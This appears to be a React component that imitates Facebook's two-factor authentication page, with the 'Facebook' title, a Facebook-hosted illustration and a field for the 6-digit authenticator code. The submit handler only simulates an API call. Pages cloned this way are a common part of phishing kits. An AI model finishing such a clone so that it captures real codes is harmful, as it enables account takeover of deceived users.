import { useState } from "react";

export default function Twofactor() {
  const [code, setCode] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!code.trim()) return;

    setIsSubmitting(true);
    // Simulate API call
    await new Promise((resolve) => setTimeout(resolve, 1000));
    setIsSubmitting(false);
  };

  const isCodeValid = code.trim().length >= 6;

  return (
    <div className="min-h-screen bg-facebook-bg overflow-auto">
      <title>Facebook</title>

      {/* Progress bar (hidden by default) */}
      <div className="fixed top-0 left-0 right-0 h-1 bg-facebook-blue opacity-0 z-50" />

      <div className="flex justify-center min-h-screen">
        <div className="flex flex-col flex-grow relative">
          <div className="flex flex-col flex-grow bg-white justify-center min-h-screen">
            <div className="flex flex-col flex-basis-640 mt-6 px-5 relative">
              <div className="flex flex-col flex-grow mx-auto mt-9 mb-6 max-w-[600px] min-h-[552px] relative">
                <div className="flex flex-col flex-grow justify-center relative">
                  <div className="flex flex-col flex-shrink-0 max-w-full relative">
                    <div className="flex flex-col flex-shrink-0 max-w-full relative">
                      <div className="flex flex-col flex-grow relative">
                        {/* Header Section */}
                        <div className="flex flex-col flex-shrink-0 mb-2.5 max-w-full relative">
                          <div className="flex flex-col">
                            <span className="text-facebook-text font-medium text-sm leading-[17px] mb-4 max-w-full relative break-words whitespace-pre-line">
                              Facebook
                            </span>
                            <h2 className="break-words">
                              <span className="text-facebook-text font-semibold text-2xl leading-7 max-w-full relative break-words whitespace-pre-line">
                                Go to your authentication app
                              </span>
                            </h2>
                            <span className="text-facebook-text text-[15px] leading-[19px] mt-3 max-w-full relative break-words whitespace-pre-line">
                              <span className="inline break-words whitespace-pre-line">
                                <div className="flex flex-col mt-1 mb-1 break-words whitespace-pre-line">
                                  <span className="text-facebook-text text-[15px] leading-[19px] max-w-full relative break-words whitespace-pre-line">
                                    <span className="inline break-words whitespace-pre-line">
                                      Enter the 6-digit code for this account
                                      from the two-factor authentication app
                                      that you set up (such as Duo Mobile or
                                      Google Authenticator).
                                    </span>
                                  </span>
                                </div>
                              </span>
                            </span>
                          </div>
                        </div>

                        {/* Illustration */}
                        <div className="flex flex-col flex-shrink-0 mb-2.5 mt-2.5 max-w-full relative">
                          <img
                            width="100%"
                            alt="Authentication app illustration"
                            src="https://www.facebook.com/images/assets_DO_NOT_HARDCODE/fb_company_illo/ACP-UnifiedDelta-AuthenticationApp-Mobile_light-3x.png"
                            className="w-full overflow-clip"
                          />
                        </div>

                        {/* Form Section */}
                        <div className="flex flex-col flex-shrink-0 mt-2.5 max-w-full relative">
                          <div>
                            <form onSubmit={handleSubmit} method="GET">
                              <div className="mb-4">
                                <div className="mb-4">
                                  <div className="flex flex-col w-full">
                                    <div className="bg-white border border-facebook-border rounded-2xl box-border flex flex-col justify-center min-h-[60px] overflow-hidden px-4 py-2.5 relative w-full">
                                      <div className="flex items-center justify-between w-full">
                                        <input
                                          dir="ltr"
                                          autoComplete="off"
                                          aria-invalid="false"
                                          type="text"
                                          value={code}
                                          onChange={(e) =>
                                            setCode(e.target.value)
                                          }
                                          tabIndex={0}
                                          className="appearance-none box-border text-facebook-text cursor-text flex-grow h-[38px] text-[15px] font-medium leading-[19px] -ml-0.5 -mr-0.5 outline-none overflow-hidden px-0.5 py-0.5 text-ellipsis touch-manipulation border-0 bg-transparent"
                                          placeholder=""
                                        />
                                        <label
                                          htmlFor="code-input"
                                          className={`text-facebook-muted font-medium absolute left-4 text-[15px] leading-[19px] max-w-full overflow-hidden pointer-events-none text-ellipsis whitespace-nowrap transition-transform duration-200 ease-out ${
                                            code
                                              ? "transform scale-75 -translate-y-4"
                                              : "top-[18px]"
                                          }`}
                                        >
                                          Code
                                        </label>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>

                              {/* Hidden submit input */}
                              <input
                                type="submit"
                                className="appearance-none bg-white border-2 border-black box-border cursor-default h-px left-[-99999px] leading-normal opacity-[0.01] overflow-hidden px-1.5 py-1.5 absolute text-center whitespace-nowrap select-none"
                              />

                              {/* Continue Button */}
                              <div className="mb-3 mt-8">
                                <div className="inline-flex relative w-full">
                                  <button
                                    type="submit"
                                    disabled={!isCodeValid || isSubmitting}
                                    className={`box-border flex flex-col justify-center relative touch-manipulation select-none w-full ${
                                      !isCodeValid || isSubmitting
                                        ? "cursor-not-allowed"
                                        : "cursor-pointer"
                                    }`}
                                  >
                                    <div
                                      className={`flex items-center justify-center box-border flex-shrink-0 h-11 px-5 relative select-none rounded-[22px] ${
                                        !isCodeValid || isSubmitting
                                          ? "bg-meta-blue opacity-40 cursor-not-allowed"
                                          : "bg-meta-blue cursor-pointer hover:bg-blue-600"
                                      }`}
                                    >
                                      <div className="flex items-center justify-center -mx-1 select-none w-full">
                                        <div className="flex items-center box-border flex-shrink-0 mx-1 max-w-full relative select-none">
                                          <span className="text-white cursor-inherit font-medium text-[15px] leading-[19px] max-w-full relative break-words select-none whitespace-pre-line">
                                            <span className="text-white cursor-inherit font-medium text-[15px] leading-[19px] max-w-full relative break-words overflow-hidden text-ellipsis whitespace-nowrap select-none">
                                              {isSubmitting
                                                ? "Verifying..."
                                                : "Continue"}
                                            </span>
                                          </span>
                                        </div>
                                      </div>
                                    </div>
                                  </button>
                                </div>
                              </div>

                              {/* Try Another Way Button */}
                              <div>
                                <div className="inline-flex relative w-full">
                                  <button
                                    type="button"
                                    className="box-border cursor-pointer flex flex-col justify-center relative touch-manipulation select-none w-full"
                                  >
                                    <div className="flex items-center bg-white border border-facebook-border rounded-[22px] box-border cursor-pointer flex-shrink-0 h-11 justify-center px-5 relative select-none">
                                      <div className="flex items-center cursor-pointer justify-center -mx-1 select-none w-full">
                                        <div className="flex items-center box-border cursor-pointer flex-shrink-0 mx-1 max-w-full relative select-none">
                                          <span className="text-facebook-text cursor-pointer font-medium text-[15px] leading-[19px] max-w-full relative break-words select-none whitespace-pre-line">
                                            <span className="text-facebook-text cursor-pointer font-medium text-[15px] leading-[19px] max-w-full relative break-words overflow-hidden text-ellipsis whitespace-nowrap select-none">
                                              Try Another Way
                                            </span>
                                          </span>
                                        </div>
                                      </div>
                                    </div>
                                  </button>
                                </div>
                              </div>
                            </form>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
